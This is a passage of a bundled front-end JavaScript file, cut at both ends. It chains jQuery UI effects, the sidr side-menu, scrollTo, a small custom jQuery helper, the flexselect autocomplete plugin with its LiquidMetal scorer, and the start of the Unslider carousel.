e.wrap(s),(e[0]===a||t.contains(e[0],a))&&t(a).focus(),s=e.parent(),"static"===e.css("position")?(s.css({position:"relative"}),e.css({position:"relative"})):(t.extend(i,{position:e.css("position"),zIndex:e.css("z-index")}),t.each(["top","left","bottom","right"],function(t,s){i[s]=e.css(s),isNaN(parseInt(i[s],10))&&(i[s]="auto")}),e.css({position:"relative",top:0,left:0,right:"auto",bottom:"auto"})),e.css(n),s.css(i).show()},removeWrapper:function(e){var i=document.activeElement;return e.parent().is(".ui-effects-wrapper")&&(e.parent().replaceWith(e),(e[0]===i||t.contains(e[0],i))&&t(i).focus()),e},setTransition:function(e,i,s,n){return n=n||{},t.each(i,function(t,i){var a=e.cssUnit(i);a[0]>0&&(n[i]=a[0]*s+a[1])}),n}}),t.fn.extend({effect:function(){function e(e){function s(){t.isFunction(a)&&a.call(n[0]),t.isFunction(e)&&e()}var n=t(this),a=i.complete,r=i.mode;(n.is(":hidden")?"hide"===r:"show"===r)?(n[r](),s()):o.call(n[0],i,s)}var i=s.apply(this,arguments),n=i.mode,a=i.queue,o=t.effects.effect[i.effect];return t.fx.off||!o?n?this[n](i.duration,i.complete):this.each(function(){i.complete&&i.complete.call(this)}):a===!1?this.each(e):this.queue(a||"fx",e)},show:function(t){return function(e){if(n(e))return t.apply(this,arguments);var i=s.apply(this,arguments);return i.mode="show",this.effect.call(this,i)}}(t.fn.show),hide:function(t){return function(e){if(n(e))return t.apply(this,arguments);var i=s.apply(this,arguments);return i.mode="hide",this.effect.call(this,i)}}(t.fn.hide),toggle:function(t){return function(e){if(n(e)||"boolean"==typeof e)return t.apply(this,arguments);var i=s.apply(this,arguments);return i.mode="toggle",this.effect.call(this,i)}}(t.fn.toggle),cssUnit:function(e){var i=this.css(e),s=[];return t.each(["em","px","%","pt"],function(t,e){i.indexOf(e)>0&&(s=[parseFloat(i),e])}),s}})}(),function(){var e={};t.each(["Quad","Cubic","Quart","Quint","Expo"],function(t,i){e[i]=function(e){return Math.pow(e,t+2)}}),t.extend(e,{Sine:function(t){return 1-Math.cos(t*Math.PI/2)},Circ:function(t){return 1-Math.sqrt(1-t*t)},Elastic:function(t){return 0===t||1===t?t:-Math.pow(2,8*(t-1))*Math.sin((80*(t-1)-7.5)*Math.PI/15)},Back:function(t){return t*t*(3*t-2)},Bounce:function(t){for(var e,i=4;((e=Math.pow(2,--i))-1)/11>t;);return 1/Math.pow(4,3-i)-7.5625*Math.pow((3*e-2)/22-t,2)}}),t.each(e,function(e,i){t.easing["easeIn"+e]=i,t.easing["easeOut"+e]=function(t){return 1-i(1-t)},t.easing["easeInOut"+e]=function(t){return.5>t?i(2*t)/2:1-i(-2*t+2)/2}})}()})(jQuery);(function(t){t.effects.effect.highlight=function(e,i){var s=t(this),n=["backgroundImage","backgroundColor","opacity"],a=t.effects.setMode(s,e.mode||"show"),o={backgroundColor:s.css("backgroundColor")};"hide"===a&&(o.opacity=0),t.effects.save(s,n),s.show().css({backgroundImage:"none",backgroundColor:e.color||"#ffff99"}).animate(o,{queue:!1,duration:e.duration,easing:e.easing,complete:function(){"hide"===a&&s.hide(),t.effects.restore(s,n),i()}})}})(jQuery);
/*! sidr - v2.2.1 - 2016-02-17
 * http://www.berriart.com/sidr/
 * Copyright (c) 2013-2016 Alberto Varela; Licensed MIT */
!function(){"use strict";function a(a,b,c){var d=new o(b);switch(a){case"open":d.open(c);break;case"close":d.close(c);break;case"toggle":d.toggle(c);break;default:p.error("Method "+a+" does not exist on jQuery.sidr")}}function b(a){return"status"===a?h:s[a]?s[a].apply(this,Array.prototype.slice.call(arguments,1)):"function"!=typeof a&&"string"!=typeof a&&a?void q.error("Method "+a+" does not exist on jQuery.sidr"):s.toggle.apply(this,arguments)}function c(a,b){if("function"==typeof b.source){var c=b.source(name);a.html(c)}else if("string"==typeof b.source&&i.isUrl(b.source))u.get(b.source,function(b){a.html(b)});else if("string"==typeof b.source){var d="",e=b.source.split(",");if(u.each(e,function(a,b){d+='<div class="sidr-inner">'+u(b).html()+"</div>"}),b.renaming){var f=u("<div />").html(d);f.find("*").each(function(a,b){var c=u(b);i.addPrefixes(c)}),d=f.html()}a.html(d)}else null!==b.source&&u.error("Invalid Sidr Source");return a}function d(a){var d=i.transitions,e=u.extend({name:"sidr",speed:200,side:"left",source:null,renaming:!0,body:"body",displace:!0,timing:"ease",method:"toggle",bind:"touchstart click",onOpen:function(){},onClose:function(){},onOpenEnd:function(){},onCloseEnd:function(){}},a),f=e.name,g=u("#"+f);return 0===g.length&&(g=u("<div />").attr("id",f).appendTo(u("body"))),d.supported&&g.css(d.property,e.side+" "+e.speed/1e3+"s "+e.timing),g.addClass("sidr").addClass(e.side).data({speed:e.speed,side:e.side,body:e.body,displace:e.displace,timing:e.timing,method:e.method,onOpen:e.onOpen,onClose:e.onClose,onOpenEnd:e.onOpenEnd,onCloseEnd:e.onCloseEnd}),g=c(g,e),this.each(function(){var a=u(this),c=a.data("sidr"),d=!1;c||(h.moving=!1,h.opened=!1,a.data("sidr",f),a.bind(e.bind,function(a){a.preventDefault(),d||(d=!0,b(e.method,f),setTimeout(function(){d=!1},100))}))})}var e={};e.classCallCheck=function(a,b){if(!(a instanceof b))throw new TypeError("Cannot call a class as a function")},e.createClass=function(){function a(a,b){for(var c=0;c<b.length;c++){var d=b[c];d.enumerable=d.enumerable||!1,d.configurable=!0,"value"in d&&(d.writable=!0),Object.defineProperty(a,d.key,d)}}return function(b,c,d){return c&&a(b.prototype,c),d&&a(b,d),b}}();var f,g,h={moving:!1,opened:!1},i={isUrl:function(a){var b=new RegExp("^(https?:\\/\\/)?((([a-z\\d]([a-z\\d-]*[a-z\\d])*)\\.?)+[a-z]{2,}|((\\d{1,3}\\.){3}\\d{1,3}))(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*(\\?[;&a-z\\d%_.~+=-]*)?(\\#[-a-z\\d_]*)?$","i");return b.test(a)?!0:!1},addPrefixes:function(a){this.addPrefix(a,"id"),this.addPrefix(a,"class"),a.removeAttr("style")},addPrefix:function(a,b){var c=a.attr(b);"string"==typeof c&&""!==c&&"sidr-inner"!==c&&a.attr(b,c.replace(/([A-Za-z0-9_.\-]+)/g,"sidr-"+b+"-$1"))},transitions:function(){var a=document.body||document.documentElement,b=a.style,c=!1,d="transition";return d in b?c=!0:!function(){var a=["moz","webkit","o","ms"],e=void 0,f=void 0;d=d.charAt(0).toUpperCase()+d.substr(1),c=function(){for(f=0;f<a.length;f++)if(e=a[f],e+d in b)return!0;return!1}(),d=c?"-"+e.toLowerCase()+"-"+d.toLowerCase():null}(),{supported:c,property:d}}()},j=jQuery,k="sidr-animating",l="open",m="close",n="webkitTransitionEnd otransitionend oTransitionEnd msTransitionEnd transitionend",o=function(){function a(b){e.classCallCheck(this,a),this.name=b,this.item=j("#"+b),this.openClass="sidr"===b?"sidr-open":"sidr-open "+b+"-open",this.menuWidth=this.item.outerWidth(!0),this.speed=this.item.data("speed"),this.side=this.item.data("side"),this.displace=this.item.data("displace"),this.timing=this.item.data("timing"),this.method=this.item.data("method"),this.onOpenCallback=this.item.data("onOpen"),this.onCloseCallback=this.item.data("onClose"),this.onOpenEndCallback=this.item.data("onOpenEnd"),this.onCloseEndCallback=this.item.data("onCloseEnd"),this.body=j(this.item.data("body"))}return e.createClass(a,[{key:"getAnimation",value:function(a,b){var c={},d=this.side;return"open"===a&&"body"===b?c[d]=this.menuWidth+"px":"close"===a&&"menu"===b?c[d]="-"+this.menuWidth+"px":c[d]=0,c}},{key:"prepareBody",value:function(a){var b="open"===a?"hidden":"";if(this.body.is("body")){var c=j("html"),d=c.scrollTop();c.css("overflow-x",b).scrollTop(d)}}},{key:"openBody",value:function(){if(this.displace){var a=i.transitions,b=this.body;if(a.supported)b.css(a.property,this.side+" "+this.speed/1e3+"s "+this.timing).css(this.side,0).css({width:b.width(),position:"absolute"}),b.css(this.side,this.menuWidth+"px");else{var c=this.getAnimation(l,"body");b.css({width:b.width(),position:"absolute"}).animate(c,{queue:!1,duration:this.speed})}}}},{key:"onCloseBody",value:function(){var a=i.transitions,b={width:"",position:"",right:"",left:""};a.supported&&(b[a.property]=""),this.body.css(b).unbind(n)}},{key:"closeBody",value:function(){var a=this;if(this.displace)if(i.transitions.supported)this.body.css(this.side,0).one(n,function(){a.onCloseBody()});else{var b=this.getAnimation(m,"body");this.body.animate(b,{queue:!1,duration:this.speed,complete:function(){a.onCloseBody()}})}}},{key:"moveBody",value:function(a){a===l?this.openBody():this.closeBody()}},{key:"onOpenMenu",value:function(a){var b=this.name;h.moving=!1,h.opened=b,this.item.unbind(n),this.body.removeClass(k).addClass(this.openClass),this.onOpenEndCallback(),"function"==typeof a&&a(b)}},{key:"openMenu",value:function(a){var b=this,c=this.item;if(i.transitions.supported)c.css(this.side,0).one(n,function(){b.onOpenMenu(a)});else{var d=this.getAnimation(l,"menu");c.css("display","block").animate(d,{queue:!1,duration:this.speed,complete:function(){b.onOpenMenu(a)}})}}},{key:"onCloseMenu",value:function(a){this.item.css({left:"",right:""}).unbind(n),j("html").css("overflow-x",""),h.moving=!1,h.opened=!1,this.body.removeClass(k).removeClass(this.openClass),this.onCloseEndCallback(),"function"==typeof a&&a(name)}},{key:"closeMenu",value:function(a){var b=this,c=this.item;if(i.transitions.supported)c.css(this.side,"").one(n,function(){b.onCloseMenu(a)});else{var d=this.getAnimation(m,"menu");c.animate(d,{queue:!1,duration:this.speed,complete:function(){b.onCloseMenu()}})}}},{key:"moveMenu",value:function(a,b){this.body.addClass(k),a===l?this.openMenu(b):this.closeMenu(b)}},{key:"move",value:function(a,b){h.moving=!0,this.prepareBody(a),this.moveBody(a),this.moveMenu(a,b)}},{key:"open",value:function(b){var c=this;if(h.opened!==this.name&&!h.moving){if(h.opened!==!1){var d=new a(h.opened);return void d.close(function(){c.open(b)})}this.move("open",b),this.onOpenCallback()}}},{key:"close",value:function(a){h.opened!==this.name||h.moving||(this.move("close",a),this.onCloseCallback())}},{key:"toggle",value:function(a){h.opened===this.name?this.close(a):this.open(a)}}]),a}(),p=jQuery,q=jQuery,r=["open","close","toggle"],s={},t=function(b){return function(c,d){"function"==typeof c?(d=c,c="sidr"):c||(c="sidr"),a(b,c,d)}};for(f=0;f<r.length;f++)g=r[f],s[g]=t(g);var u=jQuery;jQuery.sidr=b,jQuery.fn.sidr=d}();
/**
 * Copyright (c) 2007-2015 Ariel Flesler - aflesler<a>gmail<d>com | http://flesler.blogspot.com
 * Licensed under MIT
 * @author Ariel Flesler
 * @version 2.1.1
 */
;(function(f){"use strict";"function"===typeof define&&define.amd?define(["jquery"],f):"undefined"!==typeof module&&module.exports?module.exports=f(require("jquery")):f(jQuery)})(function($){"use strict";function n(a){return!a.nodeName||-1!==$.inArray(a.nodeName.toLowerCase(),["iframe","#document","html","body"])}function h(a){return $.isFunction(a)||$.isPlainObject(a)?a:{top:a,left:a}}var p=$.scrollTo=function(a,d,b){return $(window).scrollTo(a,d,b)};p.defaults={axis:"xy",duration:0,limit:!0};$.fn.scrollTo=function(a,d,b){"object"=== typeof d&&(b=d,d=0);"function"===typeof b&&(b={onAfter:b});"max"===a&&(a=9E9);b=$.extend({},p.defaults,b);d=d||b.duration;var u=b.queue&&1<b.axis.length;u&&(d/=2);b.offset=h(b.offset);b.over=h(b.over);return this.each(function(){function k(a){var k=$.extend({},b,{queue:!0,duration:d,complete:a&&function(){a.call(q,e,b)}});r.animate(f,k)}if(null!==a){var l=n(this),q=l?this.contentWindow||window:this,r=$(q),e=a,f={},t;switch(typeof e){case "number":case "string":if(/^([+-]=?)?\d+(\.\d+)?(px|%)?$/.test(e)){e= h(e);break}e=l?$(e):$(e,q);if(!e.length)return;case "object":if(e.is||e.style)t=(e=$(e)).offset()}var v=$.isFunction(b.offset)&&b.offset(q,e)||b.offset;$.each(b.axis.split(""),function(a,c){var d="x"===c?"Left":"Top",m=d.toLowerCase(),g="scroll"+d,h=r[g](),n=p.max(q,c);t?(f[g]=t[m]+(l?0:h-r.offset()[m]),b.margin&&(f[g]-=parseInt(e.css("margin"+d),10)||0,f[g]-=parseInt(e.css("border"+d+"Width"),10)||0),f[g]+=v[m]||0,b.over[m]&&(f[g]+=e["x"===c?"width":"height"]()*b.over[m])):(d=e[m],f[g]=d.slice&& "%"===d.slice(-1)?parseFloat(d)/100*n:d);b.limit&&/^\d+$/.test(f[g])&&(f[g]=0>=f[g]?0:Math.min(f[g],n));!a&&1<b.axis.length&&(h===f[g]?f={}:u&&(k(b.onAfterFirst),f={}))});k(b.onAfter)}})};p.max=function(a,d){var b="x"===d?"Width":"Height",h="scroll"+b;if(!n(a))return a[h]-$(a)[b.toLowerCase()]();var b="client"+b,k=a.ownerDocument||a.document,l=k.documentElement,k=k.body;return Math.max(l[h],k[h])-Math.min(l[b],k[b])};$.Tween.propHooks.scrollLeft=$.Tween.propHooks.scrollTop={get:function(a){return $(a.elem)[a.prop]()}, set:function(a){var d=this.get(a);if(a.options.interrupt&&a._last&&a._last!==d)return $(a.elem).stop();var b=Math.round(a.now);d!==b&&($(a.elem)[a.prop](b),a._last=this.get(a))}};return p});
/*********************************
 LivePepper Custom jQuery library
 ********************************/

if ($j) {

  /*********************************
   * Display randomly a provided number of element in a jQuery set (1 element by default)
   * @author carnaud
   * @param number
   * @returns {$j}
   */
  $j.fn.showRandomly = function (number) {
    number = number || 1
    if (this.length <= number) {
      this.show()
    }
    else {
      this.hide()
      var clone = $j(this)
      while (number--) {
        $j(clone.splice(Math.floor(Math.random() * clone.length), 1)).show()
      }
    }
    return this
  }

  /*!
   * toggleAttr() jQuery plugin
   * @link http://github.com/mathiasbynens/toggleAttr-jQuery-Plugin
   * @description Used to toggle selected="selected", disabled="disabled", checked="checked" etc…
   * @author Mathias Bynens <http://mathiasbynens.be/>
   */
  $j.fn.toggleAttr = function (attr, value) {
    return this.each(function () {
      var self = $j(this)
      if (self.attr(attr) == value)
        self.attr(attr, '')
      else
        self.attr(attr, value)
    })
  }
}
/**
 * flexselect: a jQuery plugin, version: 0.6.0 (2014-08-05)
 * @requires jQuery v1.3 or later
 *
 * FlexSelect is a jQuery plugin that makes it easy to convert a select box into
 * a Quicksilver-style, autocompleting, flex matching selection tool.
 *
 * For usage and examples, visit:
 * http://rmm5t.github.io/jquery-flexselect/
 *
 * Licensed under the MIT:
 * http://www.opensource.org/licenses/mit-license.php
 *
 * Copyright (c) 2009-2012, Ryan McGeary (ryan -[at]- mcgeary [*dot*] org)
 */
(function ($j) {
  $j.flexselect = function (select, options) { this.init(select, options) }

  $j.extend($j.flexselect.prototype, {
    settings: {
      allowMismatch: false,
      allowMismatchBlank: true, // If "true" a user can backspace such that the value is nothing (even if no blank value was provided in the original criteria)
      sortBy: 'score', // 'score' || 'name'
      preSelection: true,
      hideDropdownOnEmptyInput: false,
      selectedClass: 'flexselect_selected',
      dropdownClass: 'flexselect_dropdown',
      showDisabledOptions: false,
      inputIdTransform: function (id) { return id + '_flexselect' },
      inputNameTransform: function (name) { return },
      dropdownIdTransform: function (id) { return id + '_flexselect_dropdown' }
    },
    select: null,
    input: null,
    dropdown: null,
    dropdownList: null,
    cache: [],
    results: [],
    lastAbbreviation: null,
    abbreviationBeforeFocus: null,
    selectedIndex: 0,
    picked: false,
    allowMouseMove: true,
    dropdownMouseover: false, // Workaround for poor IE behaviors
    indexOptgroupLabels: false,

    init: function (select, options) {
      this.settings = $j.extend({}, this.settings, options)
      this.select = $j(select)
      this.preloadCache()
      this.renderControls()
      this.wire()
    },

    preloadCache: function () {
      var name, group, text, disabled
      var indexGroup = this.settings.indexOptgroupLabels
      this.cache = this.select.find('option').map(function () {
        name = $j(this).text()
        group = $j(this).parent('optgroup').attr('label')
        text = indexGroup ? [name, group].join(' ') : name
        disabled = $j(this).parent('optgroup').attr('disabled') || $j(this).attr('disabled')
        return { text: $j.trim(text), name: $j.trim(name), value: $j(this).val(), disabled: disabled, score: 0.0 }
      })
    },

    renderControls: function () {
      var selected = this.settings.preSelection ? this.select.find('option:selected') : null

      this.input = $j('<input type=\'text\' autocomplete=\'off\' />').attr({
        id: this.settings.inputIdTransform(this.select.attr('id')),
        name: this.settings.inputNameTransform(this.select.attr('name')),
        accesskey: this.select.attr('accesskey'),
        tabindex: this.select.attr('tabindex'),
        style: this.select.attr('style'),
        placeholder: this.select.attr('data-placeholder')
      }).addClass(this.select.attr('class')).val($j.trim(selected ? selected.text() : '')).css({
        visibility: 'visible'
      })

      this.dropdown = $j('<div></div>').attr({
        id: this.settings.dropdownIdTransform(this.select.attr('id'))
      }).addClass(this.settings.dropdownClass)
      this.dropdownList = $j('<ul></ul>')
      this.dropdown.append(this.dropdownList)

      this.select.after(this.input).hide()
      $j('body').append(this.dropdown)
    },

    wire: function () {
      var self = this

      this.input.click(function () {
        self.lastAbbreviation = null
        self.focus()
      })

      this.input.mouseup(function (event) {
        // This is so Safari selection actually occurs.
        event.preventDefault()
      })

      this.input.focus(function () {
        self.abbreviationBeforeFocus = self.input.val()
        self.input.select()
        if (!self.picked) self.filterResults()
      })

      this.input.blur(function () {
        if (!self.dropdownMouseover) {
          self.hide()
          if (self.settings.allowMismatchBlank && $j.trim($j(this).val()) == '')
            self.setValue('')
          if (!self.settings.allowMismatch && !self.picked)
            self.reset()
        }
        if (self.settings.hideDropdownOnEmptyInput)
          self.dropdownList.show()
      })

      this.dropdownList.mouseover(function (event) {
        if (!self.allowMouseMove) {
          self.allowMouseMove = true
          return
        }

        if (event.target.tagName == 'LI') {
          var rows = self.dropdown.find('li')
          self.markSelected(rows.index($j(event.target)))
        }
      })
      this.dropdownList.mouseleave(function () {
        self.markSelected(-1)
      })
      this.dropdownList.mouseup(function (event) {
        self.pickSelected()
        self.focusAndHide()
      })
      this.dropdown.mouseover(function (event) {
        self.dropdownMouseover = true
      })
      this.dropdown.mouseleave(function (event) {
        self.dropdownMouseover = false
      })
      this.dropdown.mousedown(function (event) {
        event.preventDefault()
      })

      this.input.keyup(function (event) {
        switch (event.keyCode) {
          case 13: // return
            event.preventDefault()
            self.pickSelected()
            self.focusAndHide()
            break
          case 27: // esc
            event.preventDefault()
            self.reset()
            self.focusAndHide()
            break
          default:
            self.filterResults()
            break
        }
        if (self.settings.hideDropdownOnEmptyInput) {
          if (self.input.val() == '')
            self.dropdownList.hide()
          else
            self.dropdownList.show()
        }
      })

      this.input.keydown(function (event) {
        switch (event.keyCode) {
          case 9:  // tab
            self.pickSelected()
            self.hide()
            break
          case 33: // pgup
            event.preventDefault()
            self.markFirst()
            break
          case 34: // pgedown
            event.preventDefault()
            self.markLast()
            break
          case 38: // up
            event.preventDefault()
            self.moveSelected(-1)
            break
          case 40: // down
            event.preventDefault()
            self.moveSelected(1)
            break
          case 13: // return
          case 27: // esc
            event.preventDefault()
            event.stopPropagation()
            break
        }
      })

      var input = this.input
      this.select.change(function () {
        input.val($j.trim($j(this).find('option:selected').text()))
      })
    },

    filterResults: function () {
      var showDisabled = this.settings.showDisabledOptions
      var abbreviation = this.input.val()
      if (abbreviation == this.lastAbbreviation) return

      var results = []
      $j.each(this.cache, function () {
        if (this.disabled && !showDisabled) return
        this.score = LiquidMetal.score(this.text, abbreviation)
        if (this.score > 0.0) results.push(this)
      })
      this.results = results

      if (this.settings.sortBy == 'score')
        this.sortResultsByScore()
      else if (this.settings.sortBy == 'name')
        this.sortResultsByName()

      this.renderDropdown()
      this.markFirst()
      this.lastAbbreviation = abbreviation
      this.picked = false
      this.allowMouseMove = false
    },

    sortResultsByScore: function () {
      this.results.sort(function (a, b) { return b.score - a.score })
    },

    sortResultsByName: function () {
      this.results.sort(function (a, b) { return a.name < b.name ? -1 : (a.name > b.name ? 1 : 0) })
    },

    renderDropdown: function () {
      var showDisabled = this.settings.showDisabledOptions
      var dropdownBorderWidth = this.dropdown.outerWidth() - this.dropdown.innerWidth()
      var inputOffset = this.input.offset()
      this.dropdown.css({
        width: (this.input.outerWidth() - dropdownBorderWidth) + 'px',
        top: (inputOffset.top + this.input.outerHeight()) + 'px',
        left: inputOffset.left + 'px',
        maxHeight: ''
      })

      var html = ''
      var disabledAttribute = ''
      $j.each(this.results, function () {
        if (this.disabled && !showDisabled) return
        disabledAttribute = this.disabled ? ' class="disabled"' : ''
        html += '<li' + disabledAttribute + '>' + this.name + '</li>'
      })
      this.dropdownList.html(html)
      this.adjustMaxHeight()
      this.dropdown.show()
    },

    adjustMaxHeight: function () {
      var maxTop = $j(window).height() + $j(window).scrollTop() - this.dropdown.outerHeight()
      var top = parseInt(this.dropdown.css('top'), 10)
      this.dropdown.css('max-height', top > maxTop ? (Math.max(0, maxTop - top + this.dropdown.innerHeight()) + 'px') : '')
    },

    markSelected: function (n) {
      if (n < 0 || n >= this.results.length) return

      var rows = this.dropdown.find('li')
      rows.removeClass(this.settings.selectedClass)

      var row = $j(rows[n])
      if (row.hasClass('disabled')) {
        this.selectedIndex = null
        return
      }

      this.selectedIndex = n
      row.addClass(this.settings.selectedClass)
      var top = row.position().top
      var delta = top + row.outerHeight() - this.dropdown.height()
      if (delta > 0) {
        this.allowMouseMove = false
        this.dropdown.scrollTop(this.dropdown.scrollTop() + delta)
      } else if (top < 0) {
        this.allowMouseMove = false
        this.dropdown.scrollTop(Math.max(0, this.dropdown.scrollTop() + top))
      }
    },

    pickSelected: function () {
      var selected = this.results[this.selectedIndex]
      if (selected && !selected.disabled) {
        this.input.val(selected.name)
        this.setValue(selected.value)
        this.picked = true
      } else if (this.settings.allowMismatch) {
        this.setValue.val('')
      } else {
        this.reset()
      }
    },

    setValue: function (val) {
      if (this.select.val() === val) return
      this.select.val(val).change()
    },

    hide: function () {
      this.dropdown.hide()
      this.lastAbbreviation = null
    },

    moveSelected: function (n) { this.markSelected(this.selectedIndex + n) },
    markFirst: function () { this.markSelected(0) },
    markLast: function () { this.markSelected(this.results.length - 1) },
    reset: function () { this.input.val(this.abbreviationBeforeFocus) },
    focus: function () { this.input.focus() },
    focusAndHide: function () {
      this.focus()
      this.hide()
    }
  })

  $j.fn.flexselect = function (options) {
    this.each(function () {
      if (this.tagName == 'SELECT') new $j.flexselect(this, options)
    })
    return this
  }
})(jQuery)
/**
 * LiquidMetal, version: 1.2.1 (2012-04-21)
 *
 * A mimetic poly-alloy of Quicksilver's scoring algorithm, essentially
 * LiquidMetal.
 *
 * For usage and examples, visit:
 * http://github.com/rmm5t/liquidmetal
 *
 * Licensed under the MIT:
 * http://www.opensource.org/licenses/mit-license.php
 *
 * Copyright (c) 2009-2012, Ryan McGeary (ryan -[at]- mcgeary [*dot*] org)
 */
var LiquidMetal = (function () {
  var SCORE_NO_MATCH = 0.0
  var SCORE_MATCH = 1.0
  var SCORE_TRAILING = 0.8
  var SCORE_TRAILING_BUT_STARTED = 0.9
  var SCORE_BUFFER = 0.85
  var WORD_SEPARATORS = ' \t_-'

  return {
    lastScore: null,
    lastScoreArray: null,

    score: function (string, abbrev) {
      // short circuits
      if (abbrev.length === 0) return SCORE_TRAILING
      if (abbrev.length > string.length) return SCORE_NO_MATCH

      // match & score all
      var allScores = []
      var search = string.toLowerCase()
      abbrev = abbrev.toLowerCase()
      this._scoreAll(string, search, abbrev, -1, 0, [], allScores)

      // complete miss
      if (allScores.length == 0) return 0

      // sum per-character scores into overall scores,
      // selecting the maximum score
      var maxScore = 0.0, maxArray = []
      for (var i = 0; i < allScores.length; i++) {
        var scores = allScores[i]
        var scoreSum = 0.0
        for (var j = 0; j < string.length; j++) { scoreSum += scores[j] }
        if (scoreSum > maxScore) {
          maxScore = scoreSum
          maxArray = scores
        }
      }

      // normalize max score by string length
      // s. t. the perfect match score = 1
      maxScore /= string.length

      // record maximum score & score array, return
      this.lastScore = maxScore
      this.lastScoreArray = maxArray
      return maxScore
    },

    _scoreAll: function (string, search, abbrev, searchIndex, abbrIndex, scores, allScores) {
      // save completed match scores at end of search
      if (abbrIndex == abbrev.length) {
        // add trailing score for the remainder of the match
        var started = (search.charAt(0) == abbrev.charAt(0))
        var trailScore = started ? SCORE_TRAILING_BUT_STARTED : SCORE_TRAILING
        fillArray(scores, trailScore, scores.length, string.length)
        // save score clone (since reference is persisted in scores)
        allScores.push(scores.slice(0))
        return
      }

      // consume current char to match
      var c = abbrev.charAt(abbrIndex)
      abbrIndex++

      // cancel match if a character is missing
      var index = search.indexOf(c, searchIndex)
      if (index == -1) return

      // match all instances of the abbreviaton char
      var scoreIndex = searchIndex // score section to update
      while ((index = search.indexOf(c, searchIndex + 1)) != -1) {
        // score this match according to context
        if (isNewWord(string, index)) {
          scores[index - 1] = 1
          fillArray(scores, SCORE_BUFFER, scoreIndex + 1, index - 1)
        }
        else if (isUpperCase(string, index)) {
          fillArray(scores, SCORE_BUFFER, scoreIndex + 1, index)
        }
        else {
          fillArray(scores, SCORE_NO_MATCH, scoreIndex + 1, index)
        }
        scores[index] = SCORE_MATCH

        // consume matched string and continue search
        searchIndex = index
        this._scoreAll(string, search, abbrev, searchIndex, abbrIndex, scores, allScores)
      }
    }
  }

  function isUpperCase (string, index) {
    var c = string.charAt(index)
    return ('A' <= c && c <= 'Z')
  }

  function isNewWord (string, index) {
    var c = string.charAt(index - 1)
    return (WORD_SEPARATORS.indexOf(c) != -1)
  }

  function fillArray (array, value, from, to) {
    for (var i = from; i < to; i++) { array[i] = value }
    return array
  }
})();
/**
 *   Unslider
 *   version 2.0
 *   by @idiot and friends
 */

(function (factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    factory(require('jquery'))
  } else if (typeof define === 'function' && define.amd) {
    // AMD. Register as an anonymous module.
    define([], factory(window.jQuery))
  } else {
    factory(window.jQuery)
  }
}(function ($) {
  //  Don't throw any errors when jQuery
  if (!$) {
    return console.warn('Unslider needs jQuery')
  }

  $.Unslider = function (context, options) {
    var self = this

    //  Create an Unslider reference we can use everywhere
    self._ = 'unslider'

    //  Store our default options in here
    //  Everything will be overwritten by the jQuery plugin though
    self.defaults = {
      //  Should the slider move on its own or only when
      //  you interact with the nav/arrows?
      //  Only accepts boolean true/false.
      autoplay: false,

      //  3 second delay between slides moving, pass
      //  as a number in milliseconds.
      delay: 3000,

      //  Animation speed in millseconds
      speed: 750,

      //  An easing string to use. If you're using Velocity, use a
      //  Velocity string otherwise you can use jQuery/jQ UI options.
      easing: 'swing', // [.42, 0, .58, 1],

      //  Does it support keyboard arrows?
      //  Can pass either true or false -
      //  or an object with the keycodes, like so:
      //  {
      //	 prev: 37,
      //	 next: 39
      // }
      //  You can call any internal method name
      //  before the keycode and it'll be called.
      keys: {
        prev: 37,
        next: 39
      },

      //  Do you want to generate clickable navigation
      //  to skip to each slide? Accepts boolean true/false or
      //  a callback function per item to generate.
      nav: true,

      //  Should there be left/right arrows to go back/forth?
      //   -> This isn't keyboard support.
      //  Either set true/false, or an object with the HTML
      //  elements for each arrow like below:
      arrows: {
        prev: '<a class="' + self._ + '-arrow prev">Prev</a>',
        next: '<a class="' + self._ + '-arrow next">Next</a>'
      },

      //  How should Unslider animate?
      //  It can do one of the following types:
      //  "fade": each slide fades in to each other
      //  "horizontal": each slide moves from left to right
      //  "vertical": each slide moves from top to bottom
      animation: 'horizontal',

      //  If you don't want to use a list to display your slides,
      //  you can change it here. Not recommended and you'll need
      //  to adjust the CSS accordingly.
      selectors: {
        container: 'ul:first',
        slides: 'li'
      },

      //  Do you want to animate the heights of each slide as
      //  it moves
      animateHeight: false,

      //  Active class for the nav
      activeClass: self._ + '-active',

      //  Have swipe support?
      //  You can set this here with a boolean and always use
      //  initSwipe/destroySwipe later on.
      swipe: true,
      // Swipe threshold -
      // lower float for enabling short swipe
      swipeThreshold: 0.2
    }

    //  Set defaults
    self.$context = context
    self.options = {}

    //  Leave our elements blank for now
    //  Since they get changed by the options, we'll need to
    //  set them in the init method.
    self.$parent = null
    self.$container = null
    self.$slides = null
    self.$nav = null
    self.$arrows = []

    //  Set our indexes and totals
    self.total = 0
    self.current = 0

    //  Generate a specific random ID so we don't dupe events
    self.prefix = self._ + '-'
    self.eventSuffix = '.' + self.prefix + ~~(Math.random() * 2e3)

    //  In case we're going to use the autoplay
    self.interval = null

    //  Get everything set up innit
    self.init = function (options) {
      //  Set up our options inside here so we can re-init at
      //  any time
      self.options = $.extend({}, self.defaults, options)

      //  Our elements
      self.$container = self.$context.find(self.options.selectors.container).addClass(self.prefix + 'wrap')
      self.$slides = self.$container.children(self.options.selectors.slides)

      //  We'll manually init the container
      self.setup()

      //  We want to keep this script as small as possible
      //  so we'll optimise some checks
      $.each(['nav', 'arrows', 'keys', 'infinite'], function (index, module) {
        self.options[module] && self['init' + $._ucfirst(module)]()
      })

      //  Add swipe support
      if (jQuery.event.special.swipe && self.options.swipe) {
        self.initSwipe()
      }

      //  If autoplay is set to true, call self.start()
      //  to start calling our timeouts
      self.options.autoplay && self.start()

      //  We should be able to recalculate slides at will
      self.calculateSlides()

      //  Listen to a ready event
      self.$context.trigger(self._ + '.ready')

      //  Everyday I'm chainin'
      return self.animate(self.options.index || self.current, 'init')
    }

    self.setup = function () {
      //  Add a CSS hook to the main element
      self.$context.addClass(self.prefix + self.options.animation).wrap('<div class="' + self._ + '" />')
      self.$parent = self.$context.parent('.' + self._)

      //  We need to manually check if the container is absolutely
      //  or relatively positioned
      var position = self.$context.css('position')

      //  If we don't already have a position set, we'll
      //  automatically set it ourselves
      if (position === 'static') {
        self.$context.css('position', 'relative')
      }

      self.$context.css('overflow', 'hidden')
    }

    //  Set up the slide widths to animate with
    //  so the box doesn't float over
    self.calculateSlides = function () {
      // update slides before recalculating the total
      self.$slides = self.$container.children(self.options.selectors.slides)

      self.total = self.$slides.length

      //  Set the total width
      if (self.options.animation !== 'fade') {
        var prop = 'width'

        if (self.options.animation === 'vertical') {
          prop = 'height'
        }

